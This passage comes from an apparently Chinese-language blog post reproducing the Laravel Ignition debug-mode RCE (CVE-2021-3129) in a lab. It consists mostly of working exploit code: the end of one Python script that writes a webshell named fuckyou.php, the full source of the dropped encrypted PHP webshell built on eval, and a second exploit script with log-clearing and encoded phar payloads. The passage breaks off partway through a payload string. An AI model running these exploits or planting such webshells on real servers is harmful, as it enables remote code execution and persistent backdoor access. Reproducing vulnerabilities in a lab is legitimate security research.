punctuation">]</span><span class="token operator">+</span><span class="token string">"/fuckyou.php"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]webshell地址:"</span><span class="token operator">+</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/fuckyou.php,密码:pass"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]漏洞不存在"</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">":"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> path<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"linux"</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>sendpayloadlinux<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span>filterlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span>pharl<span class="token punctuation">(</span>url<span class="token punctuation">,</span>path<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/fuckyou.php"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"webshell地址:"</span><span class="token operator">+</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/fuckyou.php,密码:pass"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]漏洞不存在"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python exp.py http://192.168.52.3:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.24.43.png" alt="使用exp" style="zoom:50%;"><p>webshell地址:<a href="http://192.168.52.3:8080/fuckyou.php,%E5%AF%86%E7%A0%81:pass">http://192.168.52.3:8080/fuckyou.php,密码:pass</a></p><p>蚁剑连接getshell：</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.26.46.png" style="zoom:50%;"><p>查看写入的木马：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">E</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&amp;</span> <span class="token number">15</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span><span class="token variable">$D</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">Q</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">O</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$P</span><span class="token operator">=</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">;</span><span class="token variable">$V</span><span class="token operator">=</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">;</span><span class="token variable">$T</span><span class="token operator">=</span><span class="token string single-quoted-string">'3c6e0b8a9c15224a'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$P</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$F</span><span class="token operator">=</span><span class="token function">O</span><span class="token punctuation">(</span><span class="token function">E</span><span class="token punctuation">(</span><span class="token function">O</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$P</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$T</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$V</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$L</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$V</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$A</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$L</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">nvoke</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$R</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$R</span><span class="token operator">-&gt;</span><span class="token function">nvoke</span><span class="token punctuation">(</span><span class="token variable">$A</span><span class="token punctuation">[</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token operator">.</span><span class="token variable">$T</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token number">16</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">Q</span><span class="token punctuation">(</span><span class="token function">E</span><span class="token punctuation">(</span>@<span class="token function">run</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$T</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token operator">.</span><span class="token variable">$T</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$V</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$F</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试时发现如下问题（无法连接shell）。</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.32.35.png" style="zoom:50%;"><p>可能是木马加解密导致的。</p><p>如果想简单的写入一句话木马，只需要替换sendpayloadlinux或sendpayloadwindows函数中的viewFile值即可。</p><h2 id="4-2-exp2-写入一句话木马"><a href="#4-2-exp2-写入一句话木马" class="headerlink" title="4.2 exp2-写入一句话木马"></a>4.2 exp2-写入一句话木马</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/user/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># Laravel Debug mode RCE（CVE-2021-3129）</span><span class="token keyword">import</span> json<span class="token keyword">import</span> requests<span class="token keyword">import</span> argparse<span class="token keyword">import</span> sys<span class="token keyword">import</span> reheader <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">}</span><span class="token comment"># 帮助</span><span class="token keyword">def</span> <span class="token function">cmd_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parse <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>        description<span class="token operator">=</span><span class="token string">"Laravel Debug mode RCE（CVE-2021-3129）POC &amp; EXP"</span><span class="token punctuation">,</span>  <span class="token comment"># 描述</span>        usage<span class="token operator">=</span><span class="token string">"python CVE-2021-3129.py -u [url] --exp"</span><span class="token punctuation">,</span>  <span class="token comment"># 使用方法</span>        add_help<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token comment"># 开启帮助</span>    <span class="token punctuation">)</span>    parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span> <span class="token string">'--url'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"指定目标url地址"</span><span class="token punctuation">)</span>    parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-e'</span><span class="token punctuation">,</span> <span class="token string">'--exp'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"利用漏洞写入webshell，如不指定，则仅进行漏洞检测"</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">)</span>    parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--proxy'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"设置代理，如socks5://127.0.0.1:7890"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>argv<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'-h'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> parse<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 漏洞检测</span><span class="token keyword">def</span> <span class="token function">bug_poc</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> target_url<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">:</span>        target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">"/_ignition/execute-solution"</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        clear_log<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span>        clear_log<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span>        <span class="token keyword">if</span> send_aa<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> send_poc_linux<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> filter_log<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> phar_ser_linux<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> get_path<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span>                    <span class="token keyword">if</span> result<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                        html <span class="token operator">=</span> result<span class="token punctuation">.</span>text                        pattern1 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>                            <span class="token string">r'&lt;title&gt;PHP (.*?) - phpinfo\(\)&lt;/title&gt;&lt;meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /&gt;&lt;/head&gt;'</span><span class="token punctuation">)</span>                        php_version <span class="token operator">=</span> pattern1<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                        pattern2 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;tr&gt;&lt;td class="e"&gt;System &lt;/td&gt;&lt;td class="v"&gt;(.*?)&lt;/td&gt;&lt;/tr&gt;'</span><span class="token punctuation">)</span>                        system_info <span class="token operator">=</span> pattern2<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                        pattern3 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>                            <span class="token string">r'&lt;tr&gt;&lt;td class="e"&gt;\$_SERVER\[\'DOCUMENT_ROOT\'\]&lt;/td&gt;&lt;td class="v"&gt;(.*?)&lt;/td&gt;&lt;/tr&gt;'</span><span class="token punctuation">)</span>                        document_root <span class="token operator">=</span> pattern3<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                        pattern4 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>                            <span class="token string">r'&lt;tr&gt;&lt;td class="e"&gt;\$_SERVER\[\'SERVER_ADDR\'\]&lt;/td&gt;&lt;td class="v"&gt;(.*?)&lt;/td&gt;&lt;/tr&gt;'</span><span class="token punctuation">)</span>                        server_addr <span class="token operator">=</span> pattern4<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[✅]检测到漏洞！[🚩]url: {0} [❇️info]PHP版本:{1} 网站路径:{2} 服务器地址:{3} 系统版本:{4}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span>                                                                                                           php_version<span class="token punctuation">,</span>                                                                                                           document_root<span class="token punctuation">,</span>                                                                                                           server_addr<span class="token punctuation">,</span>                                                                                                           system_info<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!]未检测到漏洞 [x]url: {0}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 漏洞利用</span><span class="token keyword">def</span> <span class="token function">bug_exp</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> target_url<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">:</span>        target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">"/_ignition/execute-solution"</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        clear_log<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span>        clear_log<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span>        <span class="token keyword">if</span> send_aa<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> send_payload_linux<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> filter_log<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> phar_ser_linux<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> get_path<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target_url <span class="token operator">+</span> <span class="token string">"/shell.php"</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>                            <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>                            <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server                        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[OK] 成功写入webshell, 访问地址 {0}/shell.php , 密码 whoami"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!]写入webshell失败"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    args <span class="token operator">=</span> cmd_line<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> args<span class="token punctuation">.</span>proxy<span class="token punctuation">:</span>        proxy_server <span class="token operator">=</span> args<span class="token punctuation">.</span>proxy    <span class="token keyword">else</span><span class="token punctuation">:</span>        proxy_server <span class="token operator">=</span> <span class="token boolean">None</span>    target_url <span class="token operator">=</span> args<span class="token punctuation">.</span>url    bug_result <span class="token operator">=</span> bug_poc<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span>    <span class="token keyword">if</span> args<span class="token punctuation">.</span>exp <span class="token keyword">and</span> bug_result<span class="token punctuation">:</span>        bug_exp<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">clear_log</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span>        <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span>            <span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token comment"># 指定 http 和 https 走什么代理</span>        <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">def</span> <span class="token function">send_aa</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span>        <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span>            <span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"AA"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token comment"># 指定 http 和 https 走什么代理</span>        <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">def</span> <span class="token function">send_payload_linux</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span>        <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span>            <span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=52=00=41=00=67=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=62=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00